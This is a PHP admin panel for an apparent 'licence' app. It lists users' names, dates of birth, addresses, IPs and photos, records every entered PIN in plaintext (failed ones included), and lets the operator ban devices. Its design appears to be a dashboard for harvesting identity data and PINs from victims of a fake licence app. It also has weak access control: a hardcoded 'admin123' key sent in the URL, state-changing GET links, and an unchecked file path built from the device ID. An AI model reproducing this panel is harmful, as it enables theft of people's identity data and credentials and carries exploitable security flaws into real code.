<?php
$key = $_GET['key'] ?? '';
if ($key !== 'admin123') {
    http_response_code(401);
    die("Unauthorized");
}

$stateFile = __DIR__ . '/latest_state.json';
$bannedFile = __DIR__ . '/banned_devices.txt';

// Handle Actions
$action = $_GET['action'] ?? '';
$device = $_GET['device'] ?? '';

if ($action && $device) {
    $device = trim($device);
    if ($action === 'ban') {
        $bannedDevices = file_exists($bannedFile) ? file($bannedFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES) : [];
        $bannedDevices = array_map('trim', $bannedDevices);
        if (!in_array($device, $bannedDevices, true)) {
            $bannedDevices[] = $device;
            file_put_contents($bannedFile, implode("\n", $bannedDevices) . "\n");
        }
    } elseif ($action === 'unban') {
        if (file_exists($bannedFile)) {
            $bannedDevices = file($bannedFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
            $bannedDevices = array_map('trim', $bannedDevices);
            $bannedDevices = array_filter($bannedDevices, fn($d) => trim($d) !== $device);
            file_put_contents($bannedFile, implode("\n", $bannedDevices) . "\n");
        }
    }
    header("Location: admin.php?key=" . urlencode($key));
    exit;
}

$state = file_exists($stateFile) ? json_decode(file_get_contents($stateFile), true) : [];
$bannedDevices = file_exists($bannedFile) ? file($bannedFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES) : [];
$bannedDevices = array_map('trim', $bannedDevices);

$successDevices = [];
$failedDevices = [];

if (is_array($state)) {
    foreach ($state as $id => $data) {
        if (($data['success'] ?? '') === 'YES') {
            $successDevices[$id] = $data;
        } else {
            $failedDevices[$id] = $data;
        }
    }
}

// Sort by last seen
uasort($successDevices, fn($a, $b) => strcmp($b['last_seen'] ?? '', $a['last_seen'] ?? ''));
uasort($failedDevices, fn($a, $b) => strcmp($b['last_seen'] ?? '', $a['last_seen'] ?? ''));

// Read Visit History
$visitsLog = '/var/log/licence-app/visits.log';
if (!file_exists($visitsLog)) {
    $visitsLog = __DIR__ . '/visits.log';
}
$visits = [];
if (file_exists($visitsLog)) {
    $lines = file($visitsLog, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    foreach ($lines as $line) {
        $v = json_decode($line, true);
        if ($v) $visits[] = $v;
    }
}
$visits = array_reverse($visits); // Show latest first

function getPhotoBase64($deviceId) {
    $path = __DIR__ . "/photos/{$deviceId}.txt";
    if (file_exists($path)) {
        $data = file_get_contents($path);
        if (strpos($data, 'data:image') === 0) {
            return $data;
        }
        return 'data:image/jpeg;base64,' . $data;
    }
    return 'https://via.placeholder.com/150x150.png?text=No+Photo';
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Licence Admin Dashboard</title>
    <style>
        :root { --primary: #007aff; --danger: #ff3b30; --success: #34c759; --bg: #f2f2f7; }
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; margin: 0; background: var(--bg); color: #000; }
        .container { max-width: 1000px; margin: 0 auto; padding: 20px; }
        header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; }
        .card { background: white; border-radius: 12px; box-shadow: 0 4px 12px rgba(0,0,0,0.05); padding: 20px; margin-bottom: 20px; overflow-x: auto; }
        h1 { font-size: 24px; margin: 0; }
        h2 { font-size: 20px; margin-top: 0; color: #333; }
        table { width: 100%; border-collapse: collapse; min-width: 600px; }
        th, td { text-align: left; padding: 12px; border-bottom: 1px solid #eee; }
        th { font-weight: 600; color: #8e8e93; font-size: 13px; text-transform: uppercase; }
        .photo-thumb { width: 60px; height: 60px; border-radius: 8px; object-fit: cover; background: #eee; cursor: pointer; }
        .btn { padding: 8px 16px; border-radius: 8px; border: none; cursor: pointer; font-size: 14px; font-weight: 600; text-decoration: none; display: inline-block; transition: opacity 0.2s; }
        .btn:active { opacity: 0.7; }
        .btn-ban { background: var(--danger); color: white; }
        .btn-unban { background: var(--success); color: white; }
        .btn-refresh { background: var(--primary); color: white; }
        .deviceId { font-family: monospace; color: #8e8e93; font-size: 11px; word-break: break-all; max-width: 120px; }
        .details { font-size: 14px; }
        .details strong { display: block; font-size: 16px; }
        .collapsible { cursor: pointer; background: #e5e5ea; padding: 10px 20px; border-radius: 8px; display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px; }
        .collapsible:after { content: '▼'; font-size: 12px; transition: transform 0.3s; }
        .collapsible.active:after { transform: rotate(180deg); }
        .content { display: none; }
        .content.show { display: block; }
        .badge { display: inline-block; padding: 2px 8px; border-radius: 10px; font-size: 11px; font-weight: 700; background: #eee; }
        .badge-banned { background: #000; color: #fff; }
        .event-badge { padding: 2px 6px; border-radius: 4px; font-size: 10px; font-weight: 700; color: white; background: #8e8e93; }
        .event-pin_success { background: var(--success); }
        .event-pin_failed { background: var(--danger); }
        .event-photo_updated { background: #5856d6; }
        .event-data_updated { background: #ff9500; }
        .event-app_loaded { background: #5ac8fa; }
        @media (max-width: 600px) {
            .container { padding: 10px; }
            th:nth-child(4), td:nth-child(4) { display: none; } /* Hide last seen on mobile */
        }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <h1>Admin Dashboard</h1>
            <div style="display: flex; gap: 10px; align-items: center;">
                <label style="font-size: 13px;"><input type="checkbox" id="autoRefresh" checked> Auto (5s)</label>
                <a href="admin.php?key=<?=htmlspecialchars($key)?>" class="btn btn-refresh">Refresh</a>
            </div>
        </header>

        <section class="card">
            <h2>Successful Logins <span class="badge"><?=count($successDevices)?></span></h2>
            <table>
                <thead>
                    <tr>
                        <th>Photo</th>
                        <th>User & Device</th>
                        <th>Last Seen</th>
                        <th>Action</th>
                    </tr>
                </thead>
                <tbody>
                    <?php if (empty($successDevices)): ?>
                    <tr><td colspan="4" style="text-align:center; color:#8e8e93;">No successful logins yet.</td></tr>
                    <?php endif; ?>
                    <?php foreach ($successDevices as $id => $d): $isBanned = in_array(trim($id), $bannedDevices, true); ?>
                    <tr>
                        <td><img src="<?=getPhotoBase64($id)?>" class="photo-thumb" onclick="window.open(this.src)"></td>
                        <td>
                            <div class="details">
                                <strong><?=htmlspecialchars($d['name'] ?? 'Unknown')?></strong>
                                <span><?=htmlspecialchars($d['dob'] ?? '')?></span><br>
                                <span style="color: #8e8e93; font-size: 12px;"><?=htmlspecialchars($d['address'] ?? '')?></span>
                            </div>
                            <div class="deviceId"><?=htmlspecialchars($id)?></div>
                            <div style="font-size: 11px; color: #007aff;"><?=htmlspecialchars($d['ip'] ?? '')?></div>
                        </td>
                        <td style="font-size: 13px; color: #333;"><?=htmlspecialchars($d['last_seen'] ?? 'N/A')?><br><small>Attempts: <?=htmlspecialchars($d['attempt_count'] ?? 0)?></small></td>
                        <td>
                            <?php if ($isBanned): ?>
                                <div style="margin-bottom: 5px;"><span class="badge badge-banned">BANNED</span></div>
                                <a href="admin.php?key=<?=htmlspecialchars($key)?>&action=unban&device=<?=urlencode($id)?>" class="btn btn-unban">Unban</a>
                            <?php else: ?>
                                <a href="admin.php?key=<?=htmlspecialchars($key)?>&action=ban&device=<?=urlencode($id)?>" class="btn btn-ban">Ban</a>
                            <?php endif; ?>
                        </td>
                    </tr>
                    <?php endforeach; ?>
                </tbody>
            </table>
        </section>

        <div class="collapsible" onclick="toggleFailed()">
            <span>Failed Attempts <span class="badge"><?=count($failedDevices)?></span></span>
        </div>
        <section id="failedContent" class="content">
            <div class="card">
                <table>
                    <thead>
                        <tr>
                            <th>Photo</th>
                            <th>Device & IP</th>
                            <th>Last Seen</th>
                            <th>Action</th>
                        </tr>
                    </thead>
                    <tbody>
                        <?php if (empty($failedDevices)): ?>
                        <tr><td colspan="4" style="text-align:center; color:#8e8e93;">No failed attempts.</td></tr>
                        <?php endif; ?>
                        <?php foreach ($failedDevices as $id => $d): $isBanned = in_array(trim($id), $bannedDevices, true); ?>
                        <tr>
                            <td><img src="<?=getPhotoBase64($id)?>" class="photo-thumb" onclick="window.open(this.src)"></td>
                            <td>
                                <div class="deviceId"><?=htmlspecialchars($id)?></div>
                                <div style="font-size: 13px; color: #007aff;"><?=htmlspecialchars($d['ip'] ?? '')?></div>
                                <div style="font-size: 12px; color: #8e8e93;">PIN Attempt: <?=htmlspecialchars($d['pin_attempt'] ?? '—')?></div>
                            </td>
                            <td style="font-size: 13px; color: #333;"><?=htmlspecialchars($d['last_seen'] ?? 'N/A')?><br><small>Attempts: <?=htmlspecialchars($d['attempt_count'] ?? 0)?></small></td>
                            <td>
                                <?php if ($isBanned): ?>
                                    <div style="margin-bottom: 5px;"><span class="badge badge-banned">BANNED</span></div>
                                    <a href="admin.php?key=<?=htmlspecialchars($key)?>&action=unban&device=<?=urlencode($id)?>" class="btn btn-unban">Unban</a>
                                <?php else: ?>
                                    <a href="admin.php?key=<?=htmlspecialchars($key)?>&action=ban&device=<?=urlencode($id)?>" class="btn btn-ban">Ban</a>
                                <?php endif; ?>
                            </td>
                        </tr>
                        <?php endforeach; ?>
                    </tbody>
                </table>
            </div>
        </section>

        <h2>Visit History <span class="badge"><?=count($visits)?></span></h2>
        <section class="card">
            <table>
                <thead>
                    <tr>
                        <th>Time</th>
                        <th>Event</th>
                        <th>Device & User</th>
                        <th>Photo</th>
                    </tr>
                </thead>
                <tbody>
                    <?php if (empty($visits)): ?>
                    <tr><td colspan="4" style="text-align:center; color:#8e8e93;">No history available.</td></tr>
                    <?php endif; ?>
                    <?php foreach ($visits as $v): 
                        $vid = $v['deviceId'] ?? 'unknown';
                        $isBanned = in_array(trim($vid), $bannedDevices, true);
                    ?>
                    <tr>
                        <td style="font-size: 12px; white-space: nowrap;"><?=htmlspecialchars($v['timestamp'] ?? '—')?></td>
                        <td>
                            <span class="event-badge event-<?=htmlspecialchars($v['event'] ?? 'unknown')?>"><?=htmlspecialchars($v['event'] ?? 'unknown')?></span>
                            <?php if (($v['pin_attempt'] ?? '—') !== '—'): ?>
                                <div style="font-size: 10px; margin-top:4px;">PIN: <?=htmlspecialchars($v['pin_attempt'])?></div>
                            <?php endif; ?>
                        </td>
                        <td>
                            <div style="font-size: 14px; font-weight: 600;"><?=htmlspecialchars($v['name'] ?? '—')?></div>
                            <div class="deviceId" style="max-width: 150px;"><?=htmlspecialchars($vid)?></div>
                            <div style="font-size: 11px; color: #007aff;"><?=htmlspecialchars($v['ip'] ?? '—')?></div>
                            <?php if ($isBanned): ?>
                                <span class="badge badge-banned" style="font-size: 9px;">BANNED</span>
                            <?php endif; ?>
                        </td>
                        <td>
                            <?php if ($v['has_photo'] ?? false): ?>
                                <img src="<?=getPhotoBase64($vid)?>" class="photo-thumb" onclick="window.open(this.src)" style="width: 40px; height: 40px;">
                            <?php else: ?>
                                <span style="color:#ccc; font-size: 10px;">No Photo</span>
                            <?php endif; ?>
                        </td>
                    </tr>
                    <?php endforeach; ?>
                </tbody>
            </table>
        </section>
    </div>

    <script>
        function toggleFailed() {
            const btn = document.querySelector(".collapsible");
            const content = document.getElementById("failedContent");
            btn.classList.toggle("active");
            content.classList.toggle("show");
        }
        setInterval(() => {
            if (document.getElementById("autoRefresh").checked) {
                window.location.reload();
            }
        }, 5000);
    </script>
</body>
</html>
